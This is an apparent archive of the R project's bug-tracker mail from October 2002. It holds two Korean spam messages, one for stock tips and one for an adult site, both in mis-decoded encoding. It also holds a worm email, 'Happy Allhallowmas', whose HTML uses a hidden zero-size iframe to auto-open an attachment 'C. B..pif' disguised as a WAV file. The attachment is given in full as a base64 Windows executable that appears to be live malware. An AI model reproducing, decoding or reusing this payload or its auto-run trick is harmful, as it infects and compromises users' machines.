            ÇàÇÏ±â´Â ½±Áö¸¸ ¾Ë¾Æ³»±â´Â Èûµç ³ëÇÏ¿ì°¡ 
ÁÖ½Ä ³ëÇÏ¿ìÀÔ´Ï´Ù. </span></font></P>
                <p><font face="±¼¸²" color="blue"><span style="FONT-SIZE: 10pt">¿ì¸® ¹é¸¸ÀåÀÚÅ¬·´¿¡¼­ Á¦°øÇÏ´Â ºñ¹ýÀº ¼Õ½Ç 
                ¾øÀÌ ¼öÀÍÀ» ³¾¼ö ÀÖ´Â ºñ¹ý ÀÔ´Ï´Ù. ÇÑ °¡Áö ¹æ¹ý¸¸À¸·Îµµ 
¼ö¹é¸¸¿ø¿¡¼­ ¼öÃµ ¸¸¿øÀÇ ¼öÀÍÀ» ³»´Â °Ç ¾î·Á¿î ÀÏÀÌ ¾Æ´Õ´Ï´Ù.</span></font><font face="±¼¸²"><span style="FONT-SIZE: 10pt"><br></span></font></p>
                <p><font face="±¼¸²"><b>Áö¹Î¼® &nbsp;<A href="mailto:lycos911@hanmail.net">lycos911@hanmail.net</a></b></font></p>
<P><A href="http://lycos.starhana.com" target="_blank"><FONT color="blue"><b>ÁÖ½ÄÅõÀÚ È¨ÆäÀÌÁö 
µé¾î¿À±â</b></FONT></A></P>
     
                <p style="PAGE-BREAK-BEFORE: always">&nbsp;</p>
        </td>
    </tr>
    <tr>
        <td width="642" height="22">
<center>
<table width="651" border="0" cellspacing="0" cellpadding="0" background="http://lycos.starhana.com/mail_form/new05/images/btm_bg.gif">
  <tr>
    <td align="middle" height="31"><font color="#ffffff"><span style="FONT-SIZE: 10pt" 
           >±ÍÇÏÀÇ ¸ÞÀÏÁÖ¼Ò´Â À¥¼­ÇÎÁß ¾Ë°Ô µÈ°ÍÀÌ¸ç, 
      e-mail ÁÖ¼Ò ¿Ü¿¡ ´Ù¸¥ Á¤º¸´Â °®°í ÀÖÁö ¾Ê½À´Ï´Ù.<br>
      Á¤ÅëºÎ ±Ç°í »çÇ×¿¡ ÀÇ°Å Á¦¸ñ¿¡ </span><font color="#ffff00"><span style="FONT-SIZE: 10pt" 
           >[±¤°í/Á¤º¸]</span></font><span style="FONT-SIZE: 10pt">¶ó°í Ç¥±âÇÑ ¸ÞÀÏÀÔ´Ï´Ù.<br>
      º» ¸ÞÀÏÀº ¹ß¼ÛÀü¿ë ¸ÞÀÏÀÓÀ¸·Î, ¿øÄ¡ ¾ÊÀ¸½Ã¸é </span><font color="#ffff00"><a href="http://lycos.starhana.com/index.php?go=etc/reject.php" target=_blank><span style="FONT-SIZE: 10pt" 
           >[¼ö½Å°ÅºÎ]</span></a></font><span style="FONT-SIZE: 10pt"> 
      ¸¦ Click ÇØ ÁÖ¼¼¿ä.</span></font></td>
  </tr>
  <tr>
    <td align="middle" height="23"><span style="FONT-SIZE: 10pt"><img src="http://lycos.starhana.com/mail_form/new05/images/copyright.gif" width="408" height="44" usemap="#Map" border="0"></span></td>
  </tr>
</table>
</center>
        </td>
    </tr>
</table>
</div>
<map name="Map">
  <area shape="RECT" coords="86,28,193,43" href="http://lycos.starhana.com/index.php?go=etc/reject.php" target=_blank>
</map>
</body>
</html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2203 *
Subject: ¿äÁò È­²öÇÑ ¼ºÀÎµ¿¿µ»ó¸¸ ¸ðÀº ÀÚ·á½Ç°ø°³[¼ºÀÎ±¤°í]
From: x¾ç <freezoneplus@yahoo.co.kr>
Date: Wed, 23 Oct 2002 13:03:05 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2203 <==
From freezoneplus@yahoo.co.kr  Wed Oct 23 06:02:53 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id GAA14073
	for <R-bugs@biostat.ku.dk>; Wed, 23 Oct 2002 06:02:51 +0200 (MET DST)
Received: from yahoo.co.kr ([61.79.206.123])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with SMTP id g9N426C6007902
	for <r-bugs@lists.r-project.org>; Wed, 23 Oct 2002 06:02:08 +0200 (MEST)
Message-Id: <200210230402.g9N426C6007902@hypatia.math.ethz.ch>
Reply-To: freezoneplus@yahoo.co.kr
From: x¾ç <freezoneplus@yahoo.co.kr>
To: <r-bugs@stat.math.ethz.ch>
Subject: ¿äÁò È­²öÇÑ ¼ºÀÎµ¿¿µ»ó¸¸ ¸ðÀº ÀÚ·á½Ç°ø°³[¼ºÀÎ±¤°í]
Sender: x¾ç <freezoneplus@yahoo.co.kr>
Mime-Version: 1.0
Content-Type: text/html; charset="ks_c_5601-1987"
Date: Wed, 23 Oct 2002 13:03:05 +0900
Content-Transfer-Encoding: 8bit

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML><HEAD>
<META http-equiv=Content-Type content="text/html; charset=euc-kr">
<META content="MSHTML 6.00.2719.2200" name=GENERATOR></HEAD>
<BODY><P><FONT size=3><STRONG>c¾ç,y¾ç,l¾ç</STRONG> µîµî ¿äÁò È­Á¦ÀÛ µ¿¿µ»ó°ú,</FONT></P>
<P><STRONG><FONT size=3>¿Ü±¹¼ºÀÎµ¿¿µ»ó+ÀÏº»µ¿¿µ»ó+<FONT color=#ff0000>±¹³»Á¦ÀÛµ¿¿µ»ó</FONT>À»</FONT></STRONG></P>
<P><FONT size=3>ÀúÈñ <STRONG>ÀÚ·á½Ç</STRONG>¿¡ ¿Ã·Á³õ¾Ò½À´Ï´Ù.</FONT> </P>
<P><FONT size=3>Áö±Ý¹Ù·Î È®ÀÎÇØ º¸¼¼¿ä!</FONT>  </P>
<P><STRONG><FONT color=#ff0000 size=3>¹«Á¶°Ç ¼ºÀÎ¸¸ ÀÔÀåÇÏ¼¼¿ä~</FONT></STRONG></P>
<P><A href="http://sexsexok.com" target="blank"><FONT size=5>http://sexsexok.com</FONT></A></P>
<P><FONT size=1>¼­¿ï½Ã µ¿´ë¹®±¸ ½Å¼³µ¿ 230-53¹øÁö 3Ãþ ¼½½º¼½½º¿ÀÄÉÀÌ´åÄÄ<BR>Á¤º¸Åë½ÅºÎ ±Ç°í »çÇ×¿¡ ÀÇ°Å Á¦¸ñ¿¡ [¼ºÀÎ±¤°í]¶ó°í Ç¥±âÇÑ ¼ºÀÎ±¤°í ¸ÞÀÏÀÔ´Ï´Ù.<BR>¼ö½ÅÀ» ¿øÄ¡ ¾ÊÀ¸½Ã¸é ¼ö½Å°ÅºÎ¸¦ ´­·¯ÁÖ¼¼¿ä</FONT></P>
<P><FONT size=1>&nbsp; - <FONT size=2><A href="mailto:freezoneplus@yahoo.co.kr">¼ö½Å°ÅºÎ</A></FONT>-</FONT></P></FONT></BODY></HTML>
Á¤º¸Åë½Å¸Á ÀÌ¿ëÃËÁø¹ý ±ÔÁ¤À» ÁØ¼öÇÏ¿© ±¤°í¸ÞÀÏÀÓÀ» Ç¥½ÃÇÏ¿´½À´Ï´Ù.
±ÍÇÏÀÇ ÀüÀÚ¿ìÆíÁÖ¼Ò´Â ÀÎÅÍ³Ý»óÀÇ °ø°³µÈ Àå¼Ò¿¡¼­ 
¸ÞÀÏÃßÃâÇÁ·Î±×·¥À¸·Î ½ÀµæÇÏ¿´À¸¸ç,ÀúÈñ´Â ±ÍÇÏÀÇ ÀüÀÚ¿ìÆíÁÖ¼Ò¿Ü
¾î¶°ÇÑ °³ÀÎÁ¤º¸µµ °¡Áö°í ÀÖÁö¾ÊÀ¸¹Ç·Î ¾È½ÉÇÏ½Ã±â ¹Ù¶ø´Ï´Ù. 
¼ö½ÅÀ» ¿øÇÏÁö ¾ÊÀ¸½Ã¸é ²À [¼ö½Å°ÅºÎ(refuse)]¸¦ ´­·¯ÁÖ¼¼¿ä
¼ö½Å°ÅºÎ·Î ÀÇ»çÇ¥½Ã¸¦ ¾ÈÇÏ½Ã¸é Áßº¹À¸·Î ÀÌ¸ÞÀÏÀÌ ¹ß¼ÛµÉ ¼öµµ ÀÖ½À´Ï´Ù.
(If you don't want this type of information or e-mail, please click the 'refuse' button)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2204 *
Subject: Happy Allhallowmas
From: snw <snw@st-and.ac.uk>
Date: Wed, 23 Oct 2002 00:08:50 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2204 <==
From vin@audio-technica.com.sg  Wed Oct 23 07:09:41 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id HAA14163
	for <r-bugs@biostat.ku.dk>; Wed, 23 Oct 2002 07:09:35 +0200 (MET DST)
Received: from [203.120.82.130] (helo=audio-technica.com.sg)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 184DlB-00016w-00
	for <r-bugs@r-project.org>; Wed, 23 Oct 2002 00:08:50 -0500
Received: from dtddak ([134.174.1.18]) by audio-technica.com.sg ; Wed, 23 Oct 2002 13:13:43 +0800 SGT
From: snw <snw@st-and.ac.uk>
To: r-bugs@r-project.org
Subject: Happy Allhallowmas
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary=UwWivCm976qV3242GR5iV8LYi
Message-ID: <103535002704@203.120.82.130>
Date: Wed, 23 Oct 2002 00:08:50 -0500

--UwWivCm976qV3242GR5iV8LYi
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD></HEAD><BODY>
<iframe src=3Dcid:Im1E6gmhV5A1 height=3D0 width=3D0>
</iframe>
<FONT></FONT></BODY></HTML>

--UwWivCm976qV3242GR5iV8LYi
Content-Type: audio/x-wav;
	name=C. B..pif
Content-Transfer-Encoding: base64
Content-ID: <Im1E6gmhV5A1>

TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAA2AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4g
RE9TIG1vZGUuDQ0KJAAAAAAAAAAYmX3gXPgTs1z4E7Nc+BOzJ+Qfs1j4E7Pf5B2zT/gTs7Tn
GbNm+BOzPucAs1X4E7Nc+BKzJfgTs7TnGLNO+BOz5P4Vs134E7NSaWNoXPgTswAAAAAAAAAA
UEUAAEwBBAC4jrc8AAAAAAAAAADgAA8BCwEGAADAAAAAkAgAAAAAAFiEAAAAEAAAANAAAAAA
QAAAEAAAABAAAAQAAAAAAAAABAAAAAAAAAAAYAkAABAAAAAAAAACAAAAAAAQAAAQAAAAABAA
ABAAAAAAAAAQAAAAAAAAAAAAAAAg1gAAZAAAAABQCQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
ANAAAOwBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAudGV4dAAAAEq6AAAAEAAAAMAAAAAQ
AAAAAAAAAAAAAAAAAAAgAABgLnJkYXRhAAAiEAAAANAAAAAgAAAA0AAAAAAAAAAAAAAAAAAA
QAAAQC5kYXRhAAAAbF4IAADwAAAAUAAAAPAAAAAAAAAAAAAAAAAAAEAAAMAucnNyYwAAABAA
AAAAUAkAEAAAAABAAQAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
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
